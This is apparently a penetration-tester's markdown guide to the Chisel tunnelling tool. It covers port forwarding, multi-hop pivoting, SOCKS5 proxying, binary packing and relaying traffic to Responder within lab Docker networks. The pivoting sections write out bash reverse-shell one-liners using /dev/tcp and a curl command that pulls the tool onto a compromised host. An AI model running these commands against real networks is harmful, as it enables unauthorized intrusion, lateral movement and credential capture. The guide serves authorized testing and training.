# Chisel

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Chisel is written in Go which provides a big advantage because it means it is naturally cross-platform  

### Table of Contents

- [Understanding Chisel](#understanding-chisel)
- [Installing Chisel](#installing-chisel)
- [Easy Chisel Example: Pivoting to a mysql server](#easy-chisel-example-pivoting-to-a-mysql-server)
- [Multi-Hop Chisel Pivoting](#multi-hop-chisel-pivoting)
- [SOCKS5 Proxy with Chisel](#socks5-proxy-with-chisel)
- [Reverse Chisel SOCKS5 Proxy](#reverse-chisel-socks5-proxy)
- [Statically Compiling Chisel for Alpine](#statically-compiling-chisel-for-alpine)
- [Making the Chisel Binary Smaller](#making-the-chisel-binary-smaller)
- [Chisel for Responder](#chisel-for-responder)


<br />

## Understanding Chisel

Chisel is a tunneling tool written in Go  
There are two chisel components, the client and the server  
Layer 4 traffic (TCP+UDP) is tunneled through HTTP between the client and the server in either direction  
Traffic going from client->server is the *forward* direction and traffic going from server->client is the *reverse* direction  

The first part of any Chisel client command is the HTTP connection to the chisel server:
```
chisel client <chisel server ip>:<chisel server port> 
```
That is followed by any number of tunnels of the form:
```
[R:]<Listen IP>:<Listen Port>:<Target IP>:<Target Port>[/udp]
```
- `R:` is included if the tunnel is a reverse direction tunnel (server -> client)
- `/udp` is included if it is a udp tunnel
- Remember, the `<Target IP>` is where the receiving side of the tunnel (can be either server or client) will send the layer 4 traffic
  - So if `R:` is specified, the *server* will bind to `<Listen IP>:<Listen Port>` and the traffic will exit from the client going to `<Target IP>:<Target Port>`
  - If `R` is not specified, the *client* will bind to `<Listen IP>:<Listen Port>` and the traffic will exit from the server going to `<Target IP>:<Target Port>`

The type of tunnel has no impact on the `<chisel server ip>:<chisel server port>` part of the command  

Chisel Server Syntax:
The chisel server syntax is very straightforward:
```
chisel server -p 8688 --host <Listen IP address> --reverse
```
- The optional `--reverse` flag means that the chisel server is capable of both reverse tunnels and forward tunnels. Without this flag it is only capable of forward tunnels  
- The optional `--host` flag specifies the IP address for the server to listen on. If omitted, `0.0.0.0` will be used
- `-p` is the port for the server to listen on

<br />

## Installing Chisel  
`git clone https://github.com/jpillora/chisel.git`  
`cd chisel`  
`go build`  

You can change the GOOS and GOARCH environment variables before building to change the operating system and architecture the binary is built for  

**Note**: All of the example in this do not use the `--host` flag when running the server. This means the server listnes on `0.0.0.0:port` which is technically dangerous. To any of these examples you could specify an interface for the server to listen on with `--host <interface>` 

<br />

## Easy Chisel Example: Pivoting to a mysql server  

Here is the scenario; we have a shell on a docker container `172.17.0.3` and there is a mysql server running on `172.17.0.2` that we would like to pivot to  

We can use Chisel to do this  

On our attack box, start the chisel server:  
```bash
./chisel server --reverse -v -p 8688
```

Move the chisel binary to the pivot box  
The following will redirect connections to our attack box's localhost on port `3306` to port `3306` on the `172.17.0.2` host:  
(We run this from the pivot box):  
```bash
./chisel client 172.17.0.1:8688 R:127.0.0.1:3306:172.17.0.2:3306
```
In this case, `172.17.0.1` is the ip address accessible from the docker network of our attack box where the chisel server is running  
Now `mysql -h 127.0.0.1 -P 3306 -u root -p` will get us a mysql client connected to the server  

Two important things to note here:  
1. You can specify multiple port redirects with the same client command. ie: 
    - `./chisel client 172.17.0.1:8688 R:127.0.0.1:3306:172.17.0.2:3306 R:127.0.0.1:8082:172.17.0.2:80`  
2. You can have multiple chisel client instances running connected to one server instance  

<br />

Say now we get code execution on the box running the mysql server, and we want it to connect back to our attack box with a reverse shell  

We need a port forward in the other direction, accepting connections from `172.17.0.2` and forwarding them to our attack box  

We can do this with:  
`./chisel client 172.17.0.1:8688 9001:127.0.0.1:8017`  

**Note**: `127.0.0.1` is the **server's** localhost in this case, not the pivot's (client's). Therefore, the above command has the same result as running:  
`./chisel client 172.17.0.1:8688 9001:172.17.0.1:8017`  

With a nc listener on `8017` and a bash reverse shell on the victim box like:  
`bash -c 'bash -i >& /dev/tcp/172.17.0.3/9001 0>&1'`  
we get a shell from the victim box through the pivot to the attack box  

<br />

## Multi-Hop Chisel Pivoting  

Imagine we have 3 hosts:  
`172.17.0.2`, `172.17.0.3`, and `172.17.0.4`. Our attack box has the address `172.17.0.1`  
For the sake of this example, pretend `.4` is only accessible from `.3` which is only accessible from `.2`, which we have a shell on.  
Assume we have code execution on all three boxes  

To get a shell straight from our attack box to the `.4` host, we need to pivot twice; once on the `.3` box and once on the `.2` box. We can do that by having a chisel client on the `.3` host connect to the chisel server on our attack host *through* the chisel client on the `.2` box. This is how we do that:  

Start chisel server on our attack host:  
- `./chisel server --reverse -v -p 8686`  

Start chisel client on `.2` box, forwarding connections on `9001` to our attack box:  
- `./chisel client 172.17.0.1:8686 9001:127.0.0.1:9001 &`  

Moving chisel to the `.3` host:
- Host a http server on `9001` on the attack box  
- On the `.3` host: `curl 172.17.0.2:9001/chisel -o chisel`  

Instruct the chisel client on the `.2` host to forward connections on `8687` to `8686` on the attack box. This will allow us to establish a chisel client->server connection from `.3` straight to our attack box:  
- `./chisel client 172.17.0.1:8686 8687:127.0.0.1:8686 &`  

Establish the chisel client->server connection from `.3` through `.2` pivot to attack box:  
- `./chisel client 172.17.0.2:8687 9003:127.0.0.1:9003 &`  

Start a nc listner on `9003` on our attack box  
Execute a bash shell to `172.17.0.3:9003` on the `.4`:  
- `bash -c 'bash -i >& /dev/tcp/172.17.0.3/9003 0>&1'`  

<br />

## SOCKS5 Proxy with Chisel

We can also use Chisel as a SOCKS5 Proxy

Here is a scenario;  
We have a shell on `172.17.0.3` and there is another box on the network `172.17.0.2` which we would like to `nmap`  

We can proxy our nmap scan through a chisel SOCKS5 server running on the pivot host  

Start the chisel server on the pivot with:  
`./chisel server -v -p 8687 --socks5`  

Start the chisel client on our attack box with:  
`./chisel client -v 172.17.0.3:8687 socks`  

The port that we connect to the SOCKS5 server on is `1080`: I am not sure how you would change that  

Edit `/etc/proxychains.conf` to have `socks5 127.0.0.1 1080`  

To scan the `172.17.0.2` target through the SOCKS proxy:  
`proxychains nmap 172.17.0.2`  

<br />

## Reverse Chisel SOCKS5 Proxy

This accomplishes the same result as the above; establishing a SOCKS proxy on the pivot  

However, this could be useful if the pivot box had a firewall, and was unwilling to accept connections on port `8687`, in the case of the last example  

In this example, the pivot has the client and initializes the connection, which allows us to get around that problem  

Start the chisel server on our attack box:  
`./chisel server --reverse -v -p 8686 --socks5`  

Start the chisel client on the pivot box:  
`./chisel client -v 172.17.0.1:8686 R:socks`  

The port that we connect to the SOCKS5 server on is `1080`: I am not sure how you would change that  

Edit `/etc/proxychains.conf` to have `socks5 127.0.0.1 1080`  

To scan the `172.17.0.2` target through the SOCKS proxy:  
`proxychains nmap 172.17.0.2`  

<br />

## Statically Compiling Chisel for Alpine

Build chisel so it can run on an Alpine OS without glibc:
```sh
CGO_ENABLED=0 go build
```

<br />

## Making the Chisel Binary Smaller  

In Ippsec's Reddish video, he has a cool bit where he shows how we can make the Chisel binary smaller. This is essentially a summary of that.  

We can look at the size of the chisel binary with:  
`du -hs chisel`  
Its 12MB to start  
Go has ldflags:  
`go build -ldflags="-s -w"`  
`-s` to strip the binary of debug information `-w` to strip the binary of dwarf information  
This reduces the size to 8.1MB  
We can then upx pack the binary with:  
`upx chisel`  
This reduces the size to 3.3M  

<br />

## Chisel for Responder

Here it is:
```sh
./chisel server -p 8688

sudo ./chisel client 10.10.15.26:8688 \
21:127.0.0.1:21 \
25:127.0.0.1:25 \
53:127.0.0.1:53 \
80:127.0.0.1:80 \
88:127.0.0.1:88 \
110:127.0.0.1:110 \
135:127.0.0.1:135 \
139:127.0.0.1:139 \
143:127.0.0.1:143 \
389:127.0.0.1:389 \
443:127.0.0.1:443 \
445:127.0.0.1:445 \
587:127.0.0.1:587 \
1433:127.0.0.1:1433 \
3128:127.0.0.1:3128 \
3141:127.0.0.1:3141 \
5985:127.0.0.1:5985 \
53:127.0.0.1:53/udp \
88:127.0.0.1:88/udp \
137:127.0.0.1:137/udp \
138:127.0.0.1:138/udp \
389:127.0.0.1:389/udp \
1434:127.0.0.1:1434/udp \
5355:127.0.0.1:5355/udp \
5353:127.0.0.1:5353/udp

sudo responder -I lo
```

